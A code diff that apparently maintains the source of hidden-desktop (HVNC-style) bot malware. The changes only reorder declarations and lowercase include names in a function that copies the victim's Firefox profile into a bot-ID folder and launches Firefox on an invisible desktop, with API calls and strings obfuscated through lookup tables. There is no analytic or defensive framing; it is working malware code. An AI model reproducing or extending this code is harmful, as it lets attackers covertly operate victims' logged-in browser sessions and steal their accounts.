@@ -1,10 +1,10 @@
 #include "HiddenDesktop.h"
-#include <Windowsx.h>
-#include <Windows.h>
-#include <Process.h>
-#include <Tlhelp32.h>
-#include <Winbase.h>
-#include <String.h>
+#include <windowsx.h>
+#include <windows.h>
+#include <process.h>
+#include <tlhelp32.h>
+#include <winbase.h>
+#include <string.h>
 #include <gdiplus.h>
 #pragma comment (lib,"Gdiplus.Lib")
 using namespace Gdiplus;
@@ -599,39 +599,45 @@ static void StartFirefox()
     DWORD profilesIniSize = GetFileSize(hProfilesIni, 0);
     DWORD read;
     char *profilesIniContent = (char *)Alloc(profilesIniSize + 1);
+    BOOL isRelative = FALSE;
+    char *isRelativeRead = NULL;
+    char *path = NULL;
+    char *pathEnd = NULL;
+    char realPath[MAX_PATH] = { 0 };
+    char botId[BOT_ID_LEN];
+    char newPath[MAX_PATH];
+    char browserPath[MAX_PATH] = { 0 };
+    STARTUPINFOA startupInfo = { 0 };
+    PROCESS_INFORMATION processInfo = { 0 };
     ReadFile(hProfilesIni, profilesIniContent, profilesIniSize, &read, NULL);
     profilesIniContent[profilesIniSize] = 0;
 
-    char *isRelativeRead = Funcs::pStrStrA(profilesIniContent, Strs::hd12);
+    isRelativeRead = Funcs::pStrStrA(profilesIniContent, Strs::hd12);
     if (!isRelativeRead)
         goto exit;
     isRelativeRead += 11;
-    BOOL isRelative = (*isRelativeRead == '1');
+    isRelative = (*isRelativeRead == '1');
 
-    char *path = Funcs::pStrStrA(profilesIniContent, Strs::hd13);
+    path = Funcs::pStrStrA(profilesIniContent, Strs::hd13);
     if (!path)
         goto exit;
-    char *pathEnd = Funcs::pStrStrA(path, "\r");
+    pathEnd = Funcs::pStrStrA(path, "\r");
     if (!pathEnd)
         goto exit;
     *pathEnd = 0;
     path += 5;
 
-    char realPath[MAX_PATH] = { 0 };
     if (isRelative)
         Funcs::pLstrcpyA(realPath, firefoxPath);
     Funcs::pLstrcatA(realPath, path);
 
-    char botId[BOT_ID_LEN];
     GetBotId(botId);
 
-    char newPath[MAX_PATH];
     Funcs::pLstrcpyA(newPath, firefoxPath);
     Funcs::pLstrcatA(newPath, botId);
 
     CopyDir(realPath, newPath);
 
-    char browserPath[MAX_PATH] = { 0 };
     Funcs::pLstrcpyA(browserPath, Strs::hd8);
     Funcs::pLstrcatA(browserPath, Strs::firefoxExe);
     Funcs::pLstrcatA(browserPath, Strs::hd14);
@@ -639,10 +645,8 @@ static void StartFirefox()
     Funcs::pLstrcatA(browserPath, newPath);
     Funcs::pLstrcatA(browserPath, "\"");
 
-    STARTUPINFOA startupInfo = { 0 };
     startupInfo.cb = sizeof(startupInfo);
     startupInfo.lpDesktop = g_desktopName;
-    PROCESS_INFORMATION processInfo = { 0 };
     Funcs::pCreateProcessA(NULL, browserPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
 
 exit:
